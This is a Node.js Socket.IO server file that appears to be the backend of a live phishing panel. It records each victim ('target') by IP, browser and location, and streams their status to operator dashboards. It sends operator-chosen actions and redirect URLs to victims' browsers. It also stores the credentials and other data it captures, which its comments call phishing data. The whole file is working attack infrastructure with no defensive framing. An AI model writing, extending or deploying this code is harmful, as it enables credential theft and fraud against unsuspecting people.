import express from 'express';
import { Server } from 'socket.io';
import http from 'http';
import pkg from 'pg';
import { v4 as uuidv4 } from 'uuid';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const { Pool } = pkg;

// Configure your database connection
const pool = new Pool({
  user: process.env.DB_USER,
  host: process.env.DB_HOST,
  database: process.env.DB_DATABASE,
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT,
});

const app = express();
app.use(express.json());
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", // Adjust this if you have a specific frontend origin
    methods: ["GET", "POST"]
  }
});

// Store target sockets by target ID: { targetID: { socket, belongsto } }
const targetSockets = new Map();

// Socket.IO logic
io.on('connection', (socket) => {
  console.log('A client connected');

  // Dashboard will call this event to join its own room
  // so it only gets updates for its own username's targets.
  socket.on('joinDashboardRoom', ({ username }) => {
    socket.join(username);
    console.log(`Dashboard joined room: ${username}`);
  });

  socket.on('updateStatus', async ({ targetID, status, currentPage }) => {
    try {
        // Update database with new status and page
        await pool.query(
            `UPDATE targets SET status = $1, currentpage = $2 WHERE id = $3`,
            [status, currentPage, targetID]
        );

        console.log(`Target ${targetID} updated: status=${status}, page=${currentPage}`);

        // Broadcast the update to the relevant dashboard
        io.emit('targetUpdated', { targetID, status, currentPage });
    } catch (err) {
        console.error('Error updating target status:', err);
    }
  });

  /**
   * Target identification:
   * The client (target) sends { belongsto, browser, location, currentPage? }
   * We:
   *  1. Generate a new targetID (uuid)
   *  2. Insert a new row into the targets table
   *  3. Store the socket in targetSockets map
   *  4. Emit 'identified' back to the target with its new targetID
   *  5. Emit 'targetAdded' to the belongsto (username) room so dashboards update live
   */
  socket.on('identify', async (data) => {
    const { 
      belongsto, 
      browser = 'UnknownBrowser', 
      location = 'Unknown Location', 
      currentPage = 'account_review' 
    } = data;

    // Generate unique ID for the target
    const targetID = uuidv4();
    
    // Get starting page for user
    let start_page = 'account_review';
    try {
      const userResult = await pool.query(
        'SELECT starting_page FROM users WHERE username = $1',
        [belongsto]
      );
      if (userResult.rows.length > 0) {
        start_page = userResult.rows[0].starting_page || 'account_review';
      }
    } catch (err) {
      console.error('Error getting starting page:', err);
    }
    
    // Derive IP address from the connection (may show "::1" for localhost)
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '0.0.0.0';

    try {
      // Insert the new target into the database
      await pool.query(
        `INSERT INTO targets (id, ip, status, currentpage, browser, location, belongsto)
         VALUES ($1, $2, 'Online', $3, $4, $5, $6)`,
        [targetID, ip, start_page, browser, location, belongsto]
      );

      console.log(`Inserted new target: ID=${targetID}, belongsto=${belongsto}, start_page=${start_page}`);
      // Store the socket reference
      targetSockets.set(targetID, { socket, belongsto });

      // Let the target know its assigned ID and starting page
      socket.emit('identified', { targetID, start_page });

      // Broadcast this new target to the dashboard room of the user
      const newTargetData = {
        id: targetID,
        ip: ip,
        status: 'Online',
        currentpage: start_page,
        browser: browser,
        location: location,
        belongsto: belongsto
      };
      io.to(belongsto).emit('targetAdded', newTargetData);

    } catch (err) {
      console.error('Error inserting target into database:', err);
    }
  });

  /**
   * Dashboard sends an action for a particular target.
   * We look up the target's socket and emit 'action' to that target.
   */
  socket.on('sendActionToTarget', async ({ targetID, action, customUrl }) => {
    const targetEntry = targetSockets.get(targetID);
    if (targetEntry) {
      targetEntry.socket.emit('action', { action, customUrl });
      console.log(`Emitted action "${action}" to target ${targetID}`);
    } else {
      console.log(`No target found with ID ${targetID}`);
    }
  });

  // Handle captured data from targets (phishing data)
  socket.on('captureData', async ({ targetID, page, data, timestamp }) => {
    try {
      console.log(`Captured data from target ${targetID} on page ${page}:`, data);
      
      // Store captured data in database
      await pool.query(
        `INSERT INTO captureddata (targetid, page, data, timestamp)
         VALUES ($1, $2, $3, $4)`,
        [targetID, page, JSON.stringify(data), timestamp]
      );

      // Notify dashboard about captured data
      const targetEntry = targetSockets.get(targetID);
      if (targetEntry) {
        io.to(targetEntry.belongsto).emit('dataCaptured', {
          targetID,
          page,
          data,
          timestamp
        });
      }

      console.log(`Stored captured data for target ${targetID}`);
    } catch (err) {
      console.error('Error storing captured data:', err);
    }
  });

  // Handle disconnection of any client
  socket.on('disconnect', () => {
    console.log('Client disconnected');
    for (const [tid, data] of targetSockets.entries()) {
      if (data.socket === socket) {
        targetSockets.delete(tid);
        console.log(`Removed target ${tid} from list`);
        // Update the database to mark target as Offline
        pool.query('UPDATE targets SET status = $1 WHERE id = $2', ['Offline', tid])
          .catch(err => console.error('Error updating target status:', err));
        break;
      }
    }
  });
});

server.listen(process.env.SOCKET_PORT || 3001, '0.0.0.0', () => {
  console.log(`Socket.IO server listening on port ${process.env.SOCKET_PORT || 3001}`);
});
